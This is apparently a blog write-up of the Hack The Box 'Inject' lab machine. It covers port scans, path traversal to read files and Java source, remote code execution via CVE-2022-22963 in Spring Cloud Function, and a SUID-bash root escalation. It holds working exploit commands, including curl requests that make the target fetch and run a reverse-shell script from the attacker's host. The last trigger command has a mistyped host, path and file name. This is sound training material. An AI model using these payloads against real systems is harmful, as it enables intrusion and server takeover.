---
title: "INJECT HTB EASY"
layout: page
date: 2023-04-29
image: https://miro.medium.com/max/786/0*Wr3Tm8LvmG57ES_2.webp
headerImage: false
tag:
- Inject 
- hackthebox
- htb
- INJECT
- EASY
- Writeup
star: true
category: blog
author: Hashar Mujahid
description: Hi This Blog is the writeup of Inject Machine from Hack The Box.
---


# NETWORK ENUMERATION:

> TCP PORTS:

```bash
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp  open     nagios-nsca Nagios NSCA
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Home
36533/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
Initiating NSE at 11:23
Completed NSE at 11:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.85 seconds
           Raw packets sent: 84873 (3.734MB) | Rcvd: 67259 (2.690MB)
```


>UDP - 200:

```bash
hax-13@ZARB:~/Documents/ctfs/htb/easy/inject-10.129.183.225$ sudo nmap -sU -p 1-200 $victim -oN nmap/udp-200
Starting Nmap 7.80 ( https://nmap.org ) at 2023-03-14 11:32 PKT
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 8.67% done; ETC: 11:32 (0:00:21 remaining)
Nmap scan report for inject.htb (10.129.183.225)
Host is up (0.21s latency).
Not shown: 199 closed ports
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 214.13 seconds

```


Let's visit the webserver at port 8080.

# WEB ENUMERATION:

>Landing Page:

![LNDING PAGE](https://imgur.com/WKjJcmX.png)

> TECHNOLOGIES:

```sql
hax-13@ZARB:~/Documents/ctfs/htb/easy/inject-10.129.183.225$ whatweb http://inject.htb:8080/
http://inject.htb:8080/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.129.183.225], Title[Home], YouTube
hax-13@ZARB:~/Documents/ctfs/htb/easy/inject-10.129.183.225$ 

```

The website is made using bootstrap and no other language is found.


> Direcotry Scan

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://inject.htb:8080/FUZZ
 :: Wordlist         : FUZZ: /opt/wordlist/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Output file      : ffuf/raft-on-root.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

register                [Status: 200, Size: 5654, Words: 1053, Lines: 104]
upload                  [Status: 200, Size: 1857, Words: 513, Lines: 54]
blogs                   [Status: 200, Size: 5371, Words: 1861, Lines: 113]
                        [Status: 200, Size: 6657, Words: 1785, Lines: 166]
:: Progress: [30000/30000] :: Job [1/1] :: 122 req/sec :: Duration: [0:04:05] :: Errors: 2 ::

```

Let's Visit the Blog And see if we can find some information.

> Blogs

![](https://imgur.com/XolbsbG.png)

We can see some usernames that can be usefull.

> Registration

The registration page is under construction.

![](https://imgur.com/n5A2FeG.png)



> UPLOAD PAGE

![](https://imgur.com/J0AJg4r.png)


Let's try to upload a image and see what happens and how this functionality operates.
![](https://imgur.com/kYpEVwh.png)


Now we can click on the url and see the image.

![](https://imgur.com/7bIMr83.png)


The url can be vulnerable to LFI or OS COMMAND INJECTION.
Or 
Another Possibility is to try to upload a `PHP` revese shell and bypass the uploading filters.(Disclamier : I was wrong the web is built on sping framework by java)
![](https://imgur.com/mrdIV14.png)


# LFI CONFIRMED ON `/show_image ` ENDPOINT.

Let's try some LFI payloads to see if it's vulnerble.
`http://inject.htb:8080/show_image?img=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`

<p align="center">
  <img src="https://cdn.memegenerator.es/imagenes/memes/full/31/95/31959497.jpg" alt="GIF"/>
</p>

![](https://imgur.com/gTZl9BO.png)

Let's traverse the directories and retrieve the source code.

>User.Java

payload = `%2e%2e%2f%2e%2e%2fmain%2fjava%2fcom%2fexample%2fWebApp%2fuser%2fUser.java`
```java

//package com.example.WebApp.user;
//
//import org.hibernate.annotations.GeneratorType;
//import org.hibernate.annotations.ValueGenerationType;
//
//import javax.persistence.*;
//
//@Entity
//@Table(name = "zodd_users")
//public class User {
//    @Id
//    @GeneratedValue(strategy = GenerationType.IDENTITY)
//    private Long id;
//
//    @Column(nullable = false, unique = true, length = 45)
//    private String email;
//
//    public String getPassword() {
//        return password;
//    }
//
//    public void setPassword(String password) {
//        this.password = password;
//    }
//
//    @Column(nullable = false, length = 64)
//    private String password;
//    private String firstName;
//    private String lastName;
//
//    public Long getId() {
//        return id;
//    }
//
//    public void setId(Long id) {
//        this.id = id;
//    }
//
//    public String getEmail() {
//        return email;
//    }
//
//    public void setEmail(String email) {
//        this.email = email;
//    }
//
//    public String getFirstName() {
//        return firstName;
//    }
//
//    public void setFirstName(String firstName) {
//        this.firstName = firstName;
//    }
//
//    public String getLastName() {
//        return lastName;
//    }
//
//    public void setLastName(String lastName) {
//        this.lastName = lastName;
//    }
//}

```

> UserController.java

```java
package com.example.WebApp.user;

import org.springframework.core.io.Resource;
import org.springframework.core.io.UrlResource;

import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;


import java.nio.file.Path;
import org.springframework.ui.Model;

import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import javax.activation.*;
import java.io.*;
import java.net.MalformedURLException;
import java.nio.file.Files;

import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

@Controller
public class UserController {

    private static String UPLOADED_FOLDER = "/var/www/WebApp/src/main/uploads/";

    @GetMapping("")
    public String homePage(){
        return "homepage";
    }

    @GetMapping("/register")
    public String signUpFormGET(){
        return "under";
    }

    @RequestMapping(value = "/upload", method = RequestMethod.GET)
    public String UploadFormGet(){
        return "upload";
    }

    @RequestMapping(value = "/show_image", method = RequestMethod.GET)
    public ResponseEntity getImage(@RequestParam("img") String name) {
        String fileName = UPLOADED_FOLDER + name;
        Path path = Paths.get(fileName);
        Resource resource = null;
        try {
            resource = new UrlResource(path.toUri());
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
    }

    @PostMapping("/upload")
    public String Upload(@RequestParam("file") MultipartFile file, Model model){
        String fileName = StringUtils.cleanPath(file.getOriginalFilename());
        if (!file.isEmpty() && !fileName.contains("/")){
            String mimetype = new MimetypesFileTypeMap().getContentType(fileName);
            String type = mimetype.split("/")[0];
            if (type.equals("image")){

                try {
                    Path path = Paths.get(UPLOADED_FOLDER+fileName);
                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e){
                    e.printStackTrace();
                }
                model.addAttribute("name", fileName);
                model.addAttribute("message", "Uploaded!");
            } else {
                model.addAttribute("message", "Only image files are accepted!");
            }
            
        } else {
            model.addAttribute("message", "Please Upload a file!");
        }
        return "upload";
    }

    @GetMapping("/release_notes")
    public String changelog(){
        return "change";
    }

    @GetMapping("/blogs")
    public String blogPage(){
        return "blog";
    }
    
}

```

Found Pom.xml. In the directory. For those who doesnot know what is pom.xml, then here is a small discription for you.
The `pom.xml` file is an important configuration file in a Java project that uses the Spring framework and is managed by Apache Maven, a popular build automation tool.
The `pom.xml` file contains information about the project, such as the project's name, version, dependencies, and build settings.It also contains the dependencies and libraries.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>

```

# FOOTHOLD [FRANK]

After analysing every exploit for the dependecies. I came to know that the spingframework.cloud for version 3.2.2. `CVE-2022-22963`.

[I found this blog where we can get the understanding of how this exploit works](https://sysdig.com/blog/cve-2022-22963-spring-cloud/)


```bash

curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"ping -c 4 10.10.14.147")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

```

![](https://imgur.com/cmZLSbw.png)

Let's see if we recieved the ping back.

![](https://imgur.com/MWJR5zP.png)


Let's get the reverse shell back.

```bash
curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.147:7777/shell.sh -o /tmp/revshell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
```

Now we have tranfered the file to victim and lets trigger it to get reverse shell.

```bash
curl -i -s -k -X $'POST' -H $'Host: inject.htb:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/shell.sh")' --data-binary $'exploit_poc' $'http://injec.htb:8080/'
```

![](https://imgur.com/6EqNQrW.png)


# PRIVILLEGE ESCALATION [PHILL]


Let's see what we can find in the Frank's Home direcory.
![](https://imgur.com/T67VlmJ.png)


We will find a settings.xml in `.m2` directory.
![](https://imgur.com/tbPgMyO.png)

We can see the password of user phil.

# PRIVESC [ROOT]

The PrivEsc is insanely easy .

After running linpeas found that `/bin/bash ` hash suid bit set.

```bash
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                       
                               ╚═══════════════════╝                                                                      
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                          
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                          
-rwsr-xr-x 1 root root 67K Feb  7  2022 /usr/bin/su                                                                       
-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash                                                                    
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 84K Nov 29 11:53 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 67K Nov 29 11:53 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 87K Nov 29 11:53 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52K Nov 29 11:53 /usr/bin/chsh
-rwsr-xr-x 1 root root 39K Feb  7  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 163K Jan 16 13:06 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 44K Nov 29 11:53 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K Feb  7  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 463K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51K Oct 25 13:09 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

So i would just have to do `/bin/bash -p` to become root.
![](https://imgur.com/a4ppcKD.png)


---
This was an easy box indeed.
